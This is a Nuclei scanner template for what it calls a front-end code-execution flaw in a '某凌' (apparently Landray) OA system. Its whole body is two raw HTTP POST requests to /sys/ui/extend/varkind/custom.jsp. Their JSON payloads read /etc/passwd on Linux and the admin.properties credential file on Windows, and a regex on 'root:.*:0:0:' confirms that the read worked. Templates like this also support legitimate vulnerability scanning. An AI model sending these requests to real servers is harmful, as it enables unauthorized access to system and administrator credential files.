id: lanlingOA-qiantai-rce

info:
  name: 某凌OA前台代码执行
  author: cnaq 
  severity: critical
  description: 某凌OA前台代码执行
  reference: 
    - https://github.com/wy876/POC/blob/main/%E6%9F%90%E5%87%8COA%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.md
  tags: wanhu,OA,file,upload

requests:
  - raw:
      - | # linux
        POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
        Host: {{Hostname}} 
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept: /
        Connection: Keep-Alive
        Content-Length: 42
        Content-Type: application/x-www-form-urlencoded

        var={"body":{"file":"file:///etc/passwd"}}

      - | #win
        POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
        Host: {{Hostname}} 
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept: /
        Connection: Keep-Alive
        Content-Length: 42
        Content-Type: application/x-www-form-urlencoded

        var={"body":{"file":"/WEB-INF/KnssConfig/admin.properties"}}

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "bit app support"
          - "fonts"
          - "extensions"
        condition: and

      - type: regex
        regex:
          - "root:.*:0:0:"